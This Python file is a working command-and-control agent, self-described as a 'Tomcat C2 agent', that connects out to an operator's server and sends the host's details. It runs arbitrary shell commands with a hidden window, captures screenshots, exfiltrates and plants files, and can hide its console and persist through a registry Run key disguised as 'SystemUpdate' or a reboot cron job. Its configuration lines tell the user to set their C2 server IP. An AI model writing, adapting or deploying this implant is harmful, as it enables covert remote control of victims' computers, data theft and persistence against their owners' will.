#!/usr/bin/python

import base64
import getpass
import json
import os
import platform
import socket
import subprocess
import sys
import time
import traceback

if platform.system() == "Windows":
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None


class TomcatAgent:
    def __init__(self, serverHost, serverPort):
        self.serverHost = serverHost
        self.serverPort = serverPort
        self.socket = None
        self.key = None
        self.running = True
        self.reconnectDelay = 5
        self.maxReconnectDelay = 60

    def connect(self):
        retryDelay = self.reconnectDelay
        print(f"[*] Connecting To {self.serverHost}:{self.serverPort}")

        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.serverHost, self.serverPort))
                print(f"[+] Connected Successfully!")
                return True
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
                print(f"[*] Retrying in {retryDelay} seconds...")
                time.sleep(retryDelay)

                # Exponential backoff
                retryDelay = min(retryDelay * 1.5, self.maxReconnectDelay)

                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    self.socket = None

        return False

    def xorCryptography(self, data, key):
        result = bytearray()
        keyBytes = key if isinstance(key, bytes) else key.encode()
        dataBytes = data if isinstance(data, bytes) else data.encode()
        for i, byte in enumerate(dataBytes):
            result.append(byte ^ keyBytes[i % len(keyBytes)])
        return bytes(result)

    def handshake(self):
        try:
            print("[*] Performing Handshake")
            self.socket.settimeout(10)
            key = self.socket.recv(1024)
            if not key:
                print("[-] No Key Received")
                return False
            self.key = key
            print(f"[+] Encryption Key Received ({len(key)} bytes)")
            info = {
                "os": platform.system(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "platform": platform.platform(),
                "architecture": platform.machine(),
                "pythonVersion": platform.python_version(),
            }
            infoJson = json.dumps(info)
            self.socket.send(infoJson.encode())
            print(f"[+] System Info Sent: {platform.node()}")
            time.sleep(0.5)
            return True
        except Exception as e:
            print(f"[-] Handshake Failed: {e}")
            return False

    def encrypt(self, data):
        try:
            from cryptography.fernet import Fernet

            cipher = Fernet(self.key)
            return cipher.encrypt(data.encode() if isinstance(data, str) else data)
        except ImportError:
            return self.xorCryptography(data, self.key)

    def decrypt(self, data):
        try:
            from cryptography.fernet import Fernet

            cipher = Fernet(self.key)
            return cipher.decrypt(data).decode()
        except ImportError:
            return self.xorCryptography(data, self.key).decode()

    def execCommand(self, command):
        try:
            if command == "SCREENSHOT":
                return self.takeScreenshot()
            elif command == "ELEVATE":
                return self.checkPrivileges()
            elif command.startswith("DOWNLOAD:"):
                filepath = command.split(":", 1)[1].strip()
                return self.readFiles(filepath)
            elif command.startswith("UPLOAD:"):
                data = command.split(":", 1)[1]
                return self.writeFiles(data)
            elif command == "SYSINFO":
                return self.getSystemInfo()
            elif command.lower() in ["exit", "quit", "disconnect"]:
                self.running = False
                return "Agent Disconnecting..."
            print(f"[*] Executing: {command}")
            if platform.system() == "Windows":
                startupinfo = None
                if hasattr(subprocess, "STARTUPINFO"):
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = 0
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60,
                    startupinfo=startupinfo,
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60,
                    executable="/bin/bash",
                )
            output = result.stdout + result.stderr
            return output if output else "Command Executed Successfully (no output)"
        except subprocess.TimeoutExpired:
            return "ERROR: Command Timeout (60s)"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def takeScreenshot(self):
        try:
            if platform.system() == "Windows":
                try:
                    from io import BytesIO

                    from PIL import ImageGrab

                    screenshot = ImageGrab.grab()
                    buffer = BytesIO()
                    screenshot.save(buffer, format="PNG")
                    imgData = base64.b64encode(buffer.getvalue()).decode()
                    return f"SCREENSHOT DATA:{imgData}"
                except ImportError:
                    pass
                psScript = """
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                [Convert]::ToBase64String($ms.ToArray())
                """
                result = subprocess.run(
                    ["powershell", "-Command", psScript],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                if result.returncode == 0 and result.stdout.strip():
                    return f"SCREENSHOT DATA:{result.stdout.strip()}"
                else:
                    return (
                        "ERROR: Screenshot failed (install pillow for better support)"
                    )
            elif platform.system() == "Linux":
                result = subprocess.run(
                    "scrot -o /tmp/screenshot.png && base64 /tmp/screenshot.png && rm /tmp/screenshot.png",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                if result.returncode == 0:
                    return f"SCREENSHOT DATA:{result.stdout.strip()}"
                else:
                    return "ERROR: Screenshot Tools Not Available (install scrot)"
            else:
                return "ERROR: Screenshot Not Supported On This Platform"
        except Exception as e:
            return f"ERROR: Screenshot failed: {str(e)}"

    def checkPrivileges(self):
        try:
            currentUser = getpass.getuser()
            isAdmin = False
            if platform.system() == "Windows":
                try:
                    import ctypes

                    isAdmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except Exception:
                    try:
                        testFiles = os.path.join(
                            os.environ.get("SystemRoot", "C:\\Windows"), "test.tmp"
                        )
                        with open(testFiles, "w") as f:
                            f.write("test")
                        os.remove(testFiles)
                        isAdmin = True
                    except Exception:
                        isAdmin = False
            else:
                isAdmin = os.getuid() == 0 if hasattr(os, "getuid") else False
            status = "Administrator/Root" if isAdmin else "Standard User"
            info = []
            info.append(">" * 150)
            info.append("PRIVILEGE CHECK")
            info.append(">" * 150)
            info.append(f"Current User: {currentUser}")
            info.append(f"Privilege Level: {status}")
            info.append(f"OS: {platform.system()}")
            if platform.system() == "Windows":
                info.append(f"Domain: {os.environ.get('USERDOMAIN', 'N/A')}")
            info.append(">" * 150)
            return "\n".join(info)
        except Exception as e:
            return f"ERROR: {str(e)}"

    def readFiles(self, filepath):
        try:
            print(f"[*] Reading file: {filepath}")
            dangerous = ["/etc/shadow", "/etc/passwd", "SAM", "SYSTEM", "win.ini"]
            if any(d in filepath for d in dangerous):
                return "ERROR: Access Denied - Sensitive System File"
            with open(filepath, "rb") as f:
                content = f.read()
            if len(content) > 10 * 1024 * 1024:
                return "ERROR: File Too Large (>10MB)"
            encoded = base64.b64encode(content).decode()
            return f"FILE DATA:{encoded}"
        except FileNotFoundError:
            return f"ERROR: File Not Found: {filepath}"
        except PermissionError:
            return f"ERROR: Permission Denied: {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def writeFiles(self, data):
        try:
            filename, encodedContent = data.split("|", 1)
            dangerous = ["/etc/", "/bin/", "/sbin/", "C:\\Windows", "C:\\Program Files"]
            if any(d in filename for d in dangerous):
                return "ERROR: Access Denied - Sensitive Location"
            content = base64.b64decode(encodedContent)
            if platform.system() == "Windows":
                downloadDir = os.path.join(
                    os.environ.get("USERPROFILE", "C:\\"), "Downloads"
                )
            else:
                downloadDir = os.path.join(os.path.expanduser("~"), "Downloads")
            os.makedirs(downloadDir, exist_ok=True)
            filepath = os.path.join(downloadDir, os.path.basename(filename))
            with open(filepath, "wb") as f:
                f.write(content)
            return f"File Uploaded Successfully!\nPath: {filepath}\nSize: {len(content)} Bytes"
        except Exception as e:
            return f"ERROR: Upload Failed: {str(e)}"

    def getSystemInfo(self):
        info = []
        info.append("=" * 60)
        info.append("SYSTEM INFORMATION")
        info.append("=" * 60)
        info.append(f"OS: {platform.system()} {platform.release()}")
        info.append(f"Platform: {platform.platform()}")
        info.append(f"Architecture: {platform.machine()}")
        info.append(f"Processor: {platform.processor()}")
        info.append(f"Hostname: {platform.node()}")
        info.append(f"Username: {getpass.getuser()}")
        info.append(f"Python: {platform.python_version()}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info.append(f"Local IP: {s.getsockname()[0]}")
            s.close()
        except Exception:
            info.append("Local IP: Unable To Determine")
        info.append(f"Current Dir: {os.getcwd()}")
        if platform.system() == "Windows":
            info.append(f"Computer: {os.environ.get('COMPUTERNAME', 'N/A')}")
            info.append(f"Domain: {os.environ.get('USERDOMAIN', 'N/A')}")
        info.append("=" * 60)
        return "\n".join(info)

    def cleanup(self):
        print("[*] Cleaning up connection...")
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
        self.key = None

    def run(self):
        print("\n" + "=" * 60)
        print("TOMCAT C2 AGENT - PERSISTENT VERSION")
        print("=" * 60)
        print("[*] Agent will automatically reconnect if connection is lost")
        print("[*] Press Ctrl+C to stop the agent\n")

        while self.running:
            try:
                # Connect to server
                if not self.connect():
                    print("[-] Failed to connect. Agent stopped.")
                    break

                # Perform handshake
                if not self.handshake():
                    print("[-] Handshake failed. Reconnecting...")
                    self.cleanup()
                    time.sleep(self.reconnectDelay)
                    continue

                print("[+] Agent Is Now Operational!")
                print("[*] Waiting For Commands...\n")

                # Main command loop
                while self.running:
                    try:
                        self.socket.settimeout(None)
                        encryptedCmd = b""
                        chunkSize = 4096
                        print("[*] Waiting For Command...")

                        while True:
                            try:
                                chunk = self.socket.recv(chunkSize)
                                if not chunk:
                                    print("[-] Connection Closed By Server")
                                    raise ConnectionError("Server closed connection")

                                encryptedCmd += chunk
                                try:
                                    command = self.decrypt(encryptedCmd)
                                    print(f"[+] Command Received: {command[:50]}...")
                                    break
                                except Exception:
                                    if len(encryptedCmd) > 1048576:
                                        raise Exception("Command Too Large")
                                    continue
                            except socket.timeout:
                                if encryptedCmd:
                                    break
                                continue

                        if not self.running:
                            break

                        output = self.execCommand(command)
                        print("[+] Command executed")

                        if len(output) > 1000000:
                            output = (
                                output[:1000000] + "\n...[OUTPUT TRUNCATED - TOO LARGE]"
                            )

                        encryptedOutput = self.encrypt(output)
                        self.socket.sendall(encryptedOutput + b"<END>")
                        print(f"[+] Response Sent ({len(encryptedOutput)} Bytes)\n")

                    except (
                        ConnectionResetError,
                        ConnectionError,
                        BrokenPipeError,
                        OSError,
                    ) as e:
                        print(f"[-] Connection Error: {e}")
                        break
                    except Exception as e:
                        print(f"[-] Error In Command Loop: {e}")
                        try:
                            errorMsg = f"ERROR: Agent Error: {str(e)}"
                            encrypted = self.encrypt(errorMsg)
                            self.socket.sendall(encrypted + b"<END>")
                        except Exception:
                            print("[-] Failed To Send Error Message")
                            break

                # Connection lost, cleanup and reconnect
                if self.running:
                    print("\n[*] Connection lost. Attempting to reconnect...")
                    self.cleanup()
                    time.sleep(self.reconnectDelay)

            except KeyboardInterrupt:
                print("\n[!] Keyboard Interrupt Received")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Unexpected Error: {e}")
                traceback.print_exc()
                if self.running:
                    print(f"[*] Reconnecting in {self.reconnectDelay} seconds...")
                    self.cleanup()
                    time.sleep(self.reconnectDelay)

        print("\n[*] Agent Shutting Down...")
        self.cleanup()


def hideConsoleWindow():
    if platform.system() == "Windows":
        try:
            import ctypes

            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except Exception:
            pass


def addAgentPersistence():
    try:
        if platform.system() == "Windows" and winreg:
            scriptPath = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(
                key, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{scriptPath}"'
            )
            winreg.CloseKey(key)
            print("[+] Persistence Added (Registry)")

        elif platform.system() == "Linux":
            scriptPath = os.path.abspath(sys.argv[0])
            cron = f"@reboot python3 {scriptPath} &\n"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
            print("[+] Persistence Added (Cron)")

    except Exception as e:
        print(f"[-] Persistence Failed: {e}")


if __name__ == "__main__":
    # CONFIGURATION
    serverHost = "127.0.0.1"  # CHANGE THIS TO YOUR C2 SERVER IP
    serverPort = 4444  # CHANGE THIS IF USING DIFFERENT PORT

    # OPTIONS
    HIDE_CONSOLE = False
    ADD_PERSISTENCE = False

    # EXECUTE
    if HIDE_CONSOLE:
        hideConsoleWindow()
    if ADD_PERSISTENCE:
        addAgentPersistence()

    agent = TomcatAgent(serverHost, serverPort)
    agent.run()
